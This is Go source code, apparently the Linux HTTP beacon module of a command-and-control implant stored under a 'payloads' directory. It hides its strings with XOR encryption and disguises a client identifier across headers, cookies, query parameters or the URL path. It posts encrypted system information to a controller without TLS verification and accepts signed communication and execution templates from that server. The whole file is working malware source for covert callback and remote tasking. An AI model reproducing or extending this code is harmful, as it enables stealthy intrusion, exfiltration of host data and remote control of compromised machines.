// server/docker/payloads/Linux/http.go

//go:build linux
// +build linux

package main

import (
	"bytes"
	"crypto"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"net/http"
	"time"
)

// HTTP strings are injected via ldflags (XOR encrypted) and decrypted at startup in getEnv.go
// Variables defined in main.go: httpHeaderUserAgent, httpHeaderContentType, httpHeaderPadPre,
// httpHeaderPadApp, httpMetaId, httpMetaEncryption, httpEncRsaAes (encrypted at rest, use secVal())

// placeInLocation places data in the specified HTTP location
// output format: "body", "header:<name>", "cookie:<name>", "query:<name>", "uri_append"
// prependLen and appendLen are NOT set here - cache headers are only for POST body data
// For non-body locations (header/cookie/query), the server uses transform.Length directly
func placeInLocation(req *http.Request, output string, data []byte, prependLen, appendLen int) {
	locType, name := parseOutput(output)

	// NOTE: We don't set cache headers here. Those are only for POST body data.
	// For clientID and other non-body data, the server uses the transform's Length
	// field directly for reversal (which is already in the config).

	switch locType {
	case "body":
		// Body is handled separately by the caller
		return
	case "header":
		req.Header.Set(name, string(data))
	case "cookie":
		req.AddCookie(&http.Cookie{Name: name, Value: string(data)})
	case "query":
		q := req.URL.Query()
		q.Set(name, string(data))
		req.URL.RawQuery = q.Encode()
	case "uri_append":
		req.URL.Path = req.URL.Path + string(data)
	}
}

// buildRequestWithTransforms creates an HTTP request with transformed clientID placed correctly
// Returns the request and body data (if output is "body")
func buildRequestWithTransforms(method, baseURL string, clientIDDataBlock *DataBlock, clientIDVal string, decrypted *ResolvedConfig) (*http.Request, []byte, error) {
	req, err := http.NewRequest(method, baseURL, nil)
	if err != nil {
		return nil, nil, fmt.Errorf("%s", ErrCtx(E12, err.Error()))
	}

	var bodyData []byte

	if clientIDDataBlock != nil && len(clientIDDataBlock.Transforms) > 0 {
		// Apply transforms to clientID
		result, err := applyTransforms([]byte(clientIDVal), clientIDDataBlock.Transforms)
		if err != nil {
			return nil, nil, fmt.Errorf("%s", ErrCtx(E18, err.Error()))
		}

		locType, _ := parseOutput(clientIDDataBlock.Output)
		if locType == "body" {
			bodyData = result.Data
			// Still set padding headers
			if result.PrependLength > 0 {
				req.Header.Set(secVal(httpHeaderPadPre), fmt.Sprintf("%d", result.PrependLength))
			}
			if result.AppendLength > 0 {
				req.Header.Set(secVal(httpHeaderPadApp), fmt.Sprintf("%d", result.AppendLength))
			}
		} else {
			placeInLocation(req, clientIDDataBlock.Output, result.Data, result.PrependLength, result.AppendLength)
		}
	} else {
		// Legacy: use query param with clientID name/format from decrypted values
		clientIDName := decrypted.GetClientIDName
		if clientIDName != "" {
			q := req.URL.Query()
			q.Set(clientIDName, clientIDVal)
			req.URL.RawQuery = q.Encode()
		}
	}

	return req, bodyData, nil
}

// PostBlk represents the structure of our post request body
type PostBlk struct {
	Data      string            `json:"data"`      // Our encrypted system info
	Metadata  map[string]string `json:"md"`  // Additional metadata
	Timestamp int64             `json:"ts"` // Current timestamp
}

type VResp struct {
	Status             string `json:"st"`
	NNID        string `json:"nc"`
	SInit bool   `json:"si"`
	Signature          string `json:"sg"`
	Seed               string `json:"seed"`
	PCfg      string `json:"ct,omitempty"` // Base64-encoded comms template
	RunCfg    string `json:"et,omitempty"` // Base64-encoded exec requirements template
}

// parseCustomHeaders converts the JSON string of custom headers into a map
func parseCustomHeaders(headerJSON string) (map[string]string, error) {
	headers := make(map[string]string)
	err := json.Unmarshal([]byte(headerJSON), &headers)
	if err != nil {
		return nil, fmt.Errorf("%s", ErrCtx(E18, err.Error()))
	}
	return headers, nil
}

func sendInitialPost(url string, encryptedData string, decrypted *ResolvedConfig) (string, error) {
	method := decrypted.PostMethod
	if method == "" {
		method = secVal(geMethodPost)
	}

	postData := PostBlk{
		Data: encryptedData,
		Metadata: map[string]string{
			secVal(httpMetaId):         clientID,
			secVal(httpMetaEncryption): secVal(httpEncRsaAes),
		},
		Timestamp: time.Now().Unix(),
	}

	jsonData, err := json.Marshal(postData)
	if err != nil {
		return "", fmt.Errorf("%s", ErrCtx(E18, err.Error()))
	}

	req, err := http.NewRequest(method, url, bytes.NewBuffer(jsonData))
	if err != nil {
		return "", fmt.Errorf("%s", ErrCtx(E12, err.Error()))
	}

	customHeaders, err := parseCustomHeaders(decrypted.CustomHeaders)
	if err != nil {
		return "", fmt.Errorf("%s", ErrCtx(E18, err.Error()))
	}

	req.Header.Set(secVal(httpHeaderUserAgent), decrypted.UserAgent)
	req.Header.Set(secVal(httpHeaderContentType), decrypted.ContentType)
	for key, value := range customHeaders {
		req.Header.Set(key, value)
	}

	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := &http.Client{Transport: tr, Timeout: time.Second * 30}

	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("%s", ErrCtx(E12, err.Error()))
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("%s", ErrCtx(E10, err.Error()))
	}

	var signedResponse VResp
	if err := json.Unmarshal(bodyBytes, &signedResponse); err != nil {
		return "", fmt.Errorf("%s", ErrCtx(E18, err.Error()))
	}

	verificationData := fmt.Sprintf("%s:%s", signedResponse.NNID, signedResponse.Seed)
	hashed := sha256.Sum256([]byte(verificationData))

	// Parse server's public key
	block, _ := pem.Decode([]byte(decrypted.PublicKey))
	if block == nil {
		return "", fmt.Errorf("%s", Err(E18))
	}

	publicKey, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		return "", fmt.Errorf("%s", ErrCtx(E18, err.Error()))
	}

	signature, err := base64.StdEncoding.DecodeString(signedResponse.Signature)
	if err != nil {
		return "", fmt.Errorf("%s", ErrCtx(E18, err.Error()))
	}

	if err := rsa.VerifyPKCS1v15(publicKey, crypto.SHA256, hashed[:], signature); err != nil {
		return "", fmt.Errorf("%s", ErrCtx(E3, err.Error()))
	}

	if signedResponse.NNID == "" {
		return "", fmt.Errorf("%s", Err(E18))
	}

	// Parse and store comms template if provided
	if signedResponse.PCfg != "" {
		if tplData, err := base64.StdEncoding.DecodeString(signedResponse.PCfg); err == nil {
			var ct PCfg
			if err := json.Unmarshal(tplData, &ct); err == nil {
				// zero old template before replacing
				if globalCommsTpl != nil {
					globalCommsTpl.zero()
				}
				globalCommsTpl = NewSecureTemplateFromSlices(ct.Version, ct.Type, ct.Templates, ct.Params)
			}
		}
	}

	// Parse and store exec requirements template if provided
	if signedResponse.RunCfg != "" {
		if tplData, err := base64.StdEncoding.DecodeString(signedResponse.RunCfg); err == nil {
			var et RunCfg
			if err := json.Unmarshal(tplData, &et); err == nil {
				setExecReqTemplate(&et)
			}
		}
	}

	return signedResponse.NNID, nil
}
